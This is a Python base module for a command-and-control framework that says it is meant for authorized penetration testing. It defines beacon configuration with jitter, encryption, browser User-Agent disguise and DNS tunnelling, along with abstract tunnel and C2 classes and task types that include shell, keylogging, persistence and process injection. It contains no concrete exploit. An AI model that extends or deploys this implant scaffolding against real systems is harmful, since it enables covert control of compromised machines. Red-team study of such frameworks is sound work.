#!/usr/bin/env python3
"""
C2 基础模块 - C2 Base Module

提供 C2 通信的基础抽象类、配置类和数据结构
仅用于授权渗透测试和安全研究

Architecture:
    BaseC2 (抽象基类)
        ├── Beacon (心跳模式)
        └── Interactive (交互模式, 未来扩展)
"""

import logging
import time
import uuid
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, Optional

logger = logging.getLogger(__name__)


class C2Status(Enum):
    """C2 连接状态"""

    IDLE = "idle"  # 空闲，未连接
    CONNECTING = "connecting"  # 正在连接
    CONNECTED = "connected"  # 已连接
    DISCONNECTED = "disconnected"  # 已断开
    RECONNECTING = "reconnecting"  # 正在重连
    ERROR = "error"  # 错误状态


class TunnelType(Enum):
    """隧道类型"""

    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    WEBSOCKET = "websocket"
    WS = "ws"
    WSS = "wss"


@dataclass
class C2Config:
    """
    C2 配置

    包含服务器连接、通信参数、加密设置和伪装配置

    Attributes:
        server: C2 服务器地址
        port: 端口号
        protocol: 通信协议 (http/https/dns/websocket)
        interval: 心跳间隔（秒）
        jitter: 抖动比例 (0.0-1.0)
        timeout: 请求超时时间
        max_retries: 最大重试次数
        encryption: 加密算法 (aes256/chacha20/xor/none)
        key: 加密密钥
        proxy: 代理地址
        user_agent: User-Agent 伪装
        headers: 自定义请求头
        domain: DNS 隧道域名
    """

    server: str
    port: int = 443
    protocol: str = "https"

    # 通信配置
    interval: float = 60.0  # 心跳间隔（秒）
    jitter: float = 0.2  # 抖动比例 (0-1)
    timeout: float = 30.0  # 请求超时
    max_retries: int = 3  # 最大重试次数
    retry_delay: float = 5.0  # 重试延迟基数

    # 加密配置
    encryption: str = "aes256_gcm"  # 加密算法: aes256_gcm, aes256_cbc, chacha20, xor, none
    key: Optional[bytes] = None  # 加密密钥
    iv: Optional[bytes] = None  # 初始化向量

    # 代理配置
    proxy: Optional[str] = None  # HTTP/SOCKS 代理

    # 伪装配置
    user_agent: str = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )
    headers: Dict[str, str] = field(default_factory=dict)

    # DNS 隧道专用
    domain: Optional[str] = None  # DNS 隧道域名
    nameserver: Optional[str] = None  # DNS 服务器

    # 端点配置
    checkin_path: str = "/api/init"
    task_path: str = "/api/poll"
    result_path: str = "/api/data"
    close_path: str = "/api/close"

    def __post_init__(self):
        """初始化后处理"""
        # 规范化协议名
        self.protocol = self.protocol.lower()

        # 自动生成密钥
        if self.encryption != "none" and self.key is None:
            import secrets

            self.key = secrets.token_bytes(32)

        # 设置默认端口
        if self.port == 443 and self.protocol in ("http", "ws"):
            self.port = 80

    def get_base_url(self) -> str:
        """获取基础 URL"""
        if self.protocol in ("http", "https"):
            return f"{self.protocol}://{self.server}:{self.port}"
        elif self.protocol in ("ws", "wss", "websocket"):
            proto = "wss" if self.protocol in ("wss", "websocket") else "ws"
            return f"{proto}://{self.server}:{self.port}"
        else:
            return f"{self.server}:{self.port}"

    def get_headers(self) -> Dict[str, str]:
        """获取完整请求头"""
        base_headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }
        base_headers.update(self.headers)
        return base_headers


@dataclass
class Task:
    """
    任务定义

    Attributes:
        id: 任务 ID
        type: 任务类型
        payload: 任务载荷
        created_at: 创建时间
        timeout: 执行超时
        priority: 优先级 (越小越高)
    """

    id: str
    type: str
    payload: Any
    created_at: float = field(default_factory=time.time)
    timeout: float = 300.0
    priority: int = 5

    @classmethod
    def create(cls, task_type: str, payload: Any, timeout: float = 300.0) -> "Task":
        """创建新任务"""
        return cls(id=str(uuid.uuid4())[:8], type=task_type, payload=payload, timeout=timeout)


@dataclass
class TaskResult:
    """
    任务结果

    Attributes:
        task_id: 对应的任务 ID
        success: 是否成功
        output: 输出结果
        error: 错误信息
        elapsed: 执行耗时
    """

    task_id: str
    success: bool
    output: Any = None
    error: Optional[str] = None
    elapsed: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "task_id": self.task_id,
            "success": self.success,
            "output": self.output,
            "error": self.error,
            "elapsed": self.elapsed,
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "TaskResult":
        """从字典创建"""
        return cls(
            task_id=data.get("task_id", ""),
            success=data.get("success", False),
            output=data.get("output"),
            error=data.get("error"),
            elapsed=data.get("elapsed", 0.0),
        )


@dataclass
class BeaconInfo:
    """
    Beacon 信息

    包含 Beacon 的系统信息和状态
    """

    beacon_id: str
    hostname: str = ""
    username: str = ""
    os_info: str = ""
    arch: str = ""
    ip_address: str = ""
    pid: int = 0
    integrity: str = "medium"  # low, medium, high, system
    first_seen: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    sleep_time: float = 60.0

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "beacon_id": self.beacon_id,
            "hostname": self.hostname,
            "username": self.username,
            "os_info": self.os_info,
            "arch": self.arch,
            "ip_address": self.ip_address,
            "pid": self.pid,
            "integrity": self.integrity,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "sleep_time": self.sleep_time,
        }


class BaseTunnel(ABC):
    """
    隧道基类

    所有隧道类型（HTTP、DNS、WebSocket）都继承此类
    """

    def __init__(self, config: C2Config):
        """
        初始化隧道

        Args:
            config: C2 配置
        """
        self.config = config
        self._connected = False
        self._session_id: Optional[str] = None

    @property
    def connected(self) -> bool:
        """是否已连接"""
        return self._connected

    @abstractmethod
    def connect(self) -> bool:
        """
        建立连接

        Returns:
            是否成功
        """
        ...

    @abstractmethod
    def disconnect(self) -> None:
        """断开连接"""
        ...

    @abstractmethod
    def send(self, data: bytes) -> bool:
        """
        发送数据

        Args:
            data: 要发送的数据

        Returns:
            是否成功
        """
        ...

    @abstractmethod
    def receive(self, timeout: Optional[float] = None) -> Optional[bytes]:
        """
        接收数据

        Args:
            timeout: 超时时间

        Returns:
            接收到的数据，无数据返回 None
        """
        ...

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, _exc_val, _exc_tb):
        self.disconnect()


class BaseC2(ABC):
    """
    C2 通信基类

    定义 C2 通信的抽象接口，所有 C2 实现都继承此类

    Usage:
        class MyC2(BaseC2):
            def connect(self) -> bool:
                ...
            def disconnect(self) -> None:
                ...
            def send(self, data: bytes) -> bool:
                ...
            def receive(self) -> Optional[bytes]:
                ...
    """

    def __init__(self, config: C2Config):
        """
        初始化 C2

        Args:
            config: C2 配置
        """
        self.config = config
        self.beacon_id = str(uuid.uuid4())
        self.status = C2Status.IDLE
        self._task_handlers: Dict[str, Callable[[Any], Any]] = {}
        self._on_status_change: Optional[Callable[[C2Status], None]] = None

    def _set_status(self, status: C2Status) -> None:
        """设置状态并触发回调"""
        old_status = self.status
        self.status = status
        if self._on_status_change and old_status != status:
            try:
                self._on_status_change(status)
            except Exception as e:
                logger.error(f"Status change callback error: {e}")

    def on_status_change(self, callback: Callable[[C2Status], None]) -> None:
        """注册状态变化回调"""
        self._on_status_change = callback

    @abstractmethod
    def connect(self) -> bool:
        """
        建立连接

        Returns:
            是否成功
        """
        ...

    @abstractmethod
    def disconnect(self) -> None:
        """断开连接"""
        ...

    @abstractmethod
    def send(self, data: bytes) -> bool:
        """
        发送数据

        Args:
            data: 要发送的数据

        Returns:
            是否成功
        """
        ...

    @abstractmethod
    def receive(self) -> Optional[bytes]:
        """
        接收数据

        Returns:
            接收到的数据，无数据返回 None
        """
        ...

    def register_handler(self, task_type: str, handler: Callable[[Any], Any]) -> None:
        """
        注册任务处理器

        Args:
            task_type: 任务类型
            handler: 处理函数，接收 payload 返回结果
        """
        self._task_handlers[task_type] = handler
        logger.debug(f"Registered handler for task type: {task_type}")

    def unregister_handler(self, task_type: str) -> None:
        """取消注册任务处理器"""
        self._task_handlers.pop(task_type, None)

    def process_task(self, task: Task) -> TaskResult:
        """
        处理任务

        Args:
            task: 要处理的任务

        Returns:
            任务结果
        """
        handler = self._task_handlers.get(task.type)

        if not handler:
            return TaskResult(
                task_id=task.id, success=False, error=f"Unknown task type: {task.type}"
            )

        start_time = time.time()

        try:
            output = handler(task.payload)
            elapsed = time.time() - start_time

            return TaskResult(task_id=task.id, success=True, output=output, elapsed=elapsed)

        except Exception as e:
            elapsed = time.time() - start_time
            logger.error(f"Task {task.id} failed: {e}")

            return TaskResult(task_id=task.id, success=False, error=str(e), elapsed=elapsed)

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, _exc_val, _exc_tb):
        self.disconnect()

    def __repr__(self) -> str:
        return f"{self.__class__.__name__}(beacon_id={self.beacon_id}, status={self.status.value})"


# 任务类型常量
class TaskTypes:
    """预定义任务类型"""

    SHELL = "shell"  # Shell 命令执行
    UPLOAD = "upload"  # 上传文件
    DOWNLOAD = "download"  # 下载文件
    SCREENSHOT = "screenshot"  # 截图
    KEYLOG = "keylog"  # 键盘记录
    PERSIST = "persist"  # 持久化
    SLEEP = "sleep"  # 修改睡眠时间
    EXIT = "exit"  # 退出
    CHECKIN = "checkin"  # 签到
    PS = "ps"  # 进程列表
    KILL = "kill"  # 结束进程
    CD = "cd"  # 切换目录
    PWD = "pwd"  # 当前目录
    LS = "ls"  # 目录列表
    CAT = "cat"  # 读取文件
    INJECT = "inject"  # 进程注入
    MIGRATE = "migrate"  # 进程迁移


__all__ = [
    "C2Status",
    "TunnelType",
    "C2Config",
    "Task",
    "TaskResult",
    "BeaconInfo",
    "BaseTunnel",
    "BaseC2",
    "TaskTypes",
]
